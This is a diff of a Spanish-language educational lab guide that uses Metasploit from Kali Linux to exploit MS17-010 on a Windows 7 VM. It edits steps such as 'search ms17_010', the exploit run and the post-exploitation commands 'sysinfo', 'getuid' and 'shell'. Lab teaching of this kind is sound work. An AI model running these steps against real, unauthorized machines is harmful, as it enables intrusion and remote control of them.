@@ -11,6 +11,8 @@ Este laboratorio es para fines educativos y su contenido no debe ser utilizado p
 * Máquina objetivo: Windows 7 64bits  
 * Equipo Auditor: Kali Linux 
 
+**Inciar virtualbox y encender las VM de Kali Linux y Windows 7 64bits**
+
 **Utilizar un scanner auxiliar para detercar si el equipo es vulnerable a  MS17-010**
 * Desde Kali Linux Inicie una sesión de terminal y escriba los siguientes comandos:
 ```
@@ -19,7 +21,7 @@ msfconsole
 ![alt text](./lab01-images/lab01-fig1-msf-console.png "Metasploit framework")
 
 ```
-Search ms17_010
+search ms17_010
 ```
 ![alt text](./lab01-images/lab01-fig2-msf-console.PNG "Metasploit framework")
 ```
@@ -49,15 +51,15 @@ exploit
  
 **Post Explotación**
 ```bash
-Sysinfo
+sysinfo
 ```
 ![alt text](./lab01-images/lab01-fig5-msf-console.PNG "Metasploit framework")
 ```bash
-Getuid
+getuid
 ```
 ![alt text](./lab01-images/lab01-fig6-msf-console.PNG "Metasploit framework")
 ```Bash
-Shell
+shell
 ```
 ![alt text](./lab01-images/lab01-fig7-msf-console.PNG "Metasploit framework")
 
